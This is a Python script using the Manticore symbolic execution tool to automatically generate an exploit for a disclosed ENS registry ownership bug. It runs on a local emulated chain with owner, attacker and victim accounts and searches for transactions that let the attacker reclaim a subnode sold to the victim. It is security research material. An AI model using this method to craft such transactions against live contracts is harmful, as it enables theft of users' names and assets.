# Automatic Exploit Generation for the ENS bug. The silver bullet. Amazing!!
# https://medium.com/the-ethereum-name-service/ens-registry-migration-bug-fix-new-features-64379193a5a

from binascii import unhexlify 
from manticore import config
from manticore.ethereum import ManticoreEVM, ABI
from manticore.platforms.evm import globalsha3
ETHER = 10**18 
m = ManticoreEVM()
# Initialization bytecode downloaded from: 
# https://etherscan.io/address/0x314159265dd8dbb310642f98f50c066173c1259b#code
# Alternativelly you could compile hte serpent code found there
init_bytecode = unhexlify("3360206000015561021a806100146000396000f3630178b8bf60e060020a600035041415610020576004355460405260206040f35b6302571be360e060020a600035041415610044576020600435015460405260206040f35b6316a25cbd60e060020a600035041415610068576040600435015460405260206040f35b635b0fc9c360e060020a6000350414156100b557602060043501543314151561008f576002565b6024356020600435015560243560405260043560198061020160003960002060206040a2005b6306ab592360e060020a6000350414156101135760206004350154331415156100dc576002565b6044356020600435600052602435602052604060002001556044356040526024356004356021806101e060003960002060206040a3005b631896f70a60e060020a60003504141561015d57602060043501543314151561013a576002565b60243560043555602435604052600435601c806101c460003960002060206040a2005b6314ab903860e060020a6000350414156101aa576020600435015433141515610184576002565b602435604060043501556024356040526004356016806101ae60003960002060206040a2005b6002564e657754544c28627974657333322c75696e743634294e65775265736f6c76657228627974657333322c61646472657373294e65774f776e657228627974657333322c627974657333322c61646472657373295472616e7366657228627974657333322c6164647265737329")

# Create some accounts to recreate the attack
owner = m.create_account(balance=1 * ETHER)
attacker = m.create_account(balance=1 * ETHER)
victim = m.create_account(balance=1 * ETHER)

#CREATE tx.. https://etherscan.io/tx/0x40ea7c00f622a7c6699a0013a26e2399d0cd167f8565062a43eb962c6750f7db
# This will run the initialization bytecode and create the contract account for ENS
contract = m.create_contract(init=init_bytecode, owner=owner)

# This is unnecessary (but nice)
# We let manticore know about the abi so we can encode the transactions easily 
functions = ('owner(bytes32)','resolver(bytes32)','ttl(bytes32)','setOwner(bytes32,address)','setSubnodeOwner(bytes32,bytes32,address)','setResolver(bytes32,address)','setTTL(bytes32,uint64)')
for signature in functions:
    contract.add_function(signature)


print ("[+] Accounts in the emulated ethereum world:")
print (f"     The contract address:\t{contract:x}")
print (f"     The owner address:   \t{owner:x}")
print (f"     The attacker address:\t{attacker:x}")
print (f"     The victim address:\t{victim:x}")

# 1 Concrete transaction
# This will encode a setSubnodeOwner transaction based on the provided signature
print ("[+] ENS root owner gives the attacker a subnode ('tob')")
root_node = b"\x00"*32
node = unhexlify("2bcc18f608e191ae31db40a291c23d2c4b0c6a9998174955eaa14044d6677c8b") # hash("tob")
contract.setSubnodeOwner(root_node, node, attacker) # caller=owner

# 2 Symbolic transaction
# This will sent a transaction with 100 symbolic bytes in the calldata
# The function_id and all possible arguments included
print ("[+] Let the attacker prepare the attack. Manticore AEG.")
data_tx1 = m.make_symbolic_buffer(4+32*3)
m.transaction(caller=attacker, address=contract, data=data_tx1, value=0)

# 3 Concrete transaction
print ("[+] The attacker `sells` the node to a victim (and transfer it)")
# The attacker only onws the sub node "tob." hash(0,0x2bcc18f608e191ae31db40a291c23d2c4b0c6a9998174955eaa14044d6677c8b)
subnode = unhexlify("bb6346a9c6ed45f95a4faaf4c0e9859d34e43a3a342e2e8345efd8a72c57b1fc")  # 1fc!
contract.setOwner(subnode, victim, caller=attacker)
#subnode owner was set to victim

# 4 Symbolic transaction
print ("[+] Now lets the attacker finalize the exploit somehow. Manticore AEG.")
data_tx2 = m.make_symbolic_buffer(4+32*3)
m.transaction(caller=attacker, address=contract, data=data_tx2, value=0)


# Check the owner of the subnode
# This sends a tx that asks for the owner of subnode then we need to
# find a state in which this tx returns the attacker address
contract.owner(subnode)

# Symbolic transactions generate a number of different states representing each
# possible trace. If we find a state in which the owner of the subnode is the attacker
# then we found an exploit trace
print ("[+] Check if the subnode owner is victim in all correct final states.")
for st in m.ready_states:
    world = st.platform
    # parse the return_data of the last transaction as an uint
    stored_owner = ABI.deserialize("uint", st.platform.transactions[-1].return_data)
    # It could be symbolic so we ask the solver
    if st.can_be_true(stored_owner == attacker):
        # if it is feasible then constraint it and recreqte the full exploit trace
        st.constrain(stored_owner == attacker)
        print ("[*] Exploit found! (The owner of subnode is again the attacker)") 

        # Trying to make it print the tx trace 
        # ALWAYS write your own parser.
        for tx in st.platform.transactions[1:]:
            conc_tx = tx.concretize(st, constrain=True)
            for signature in functions:
                func_id = ABI.function_selector(signature)
                
                if func_id == conc_tx.data[:4]:
                    name = signature.split('(')[0]
                    nargs = signature.count(',')
                    rawsignature = ('(uint)', '(uint,uint)', '(uint,uint,uint)')[nargs] 
                    args = map(hex, ABI.deserialize(rawsignature, conc_tx.data[4:]))
                    print (f"     {name}({', '.join(args)})")
                    break
        #This generates a more verbose trace and info about the state            
        m.generate_testcase(st)

print(f"[+] Look for testcases here: {m.workspace}")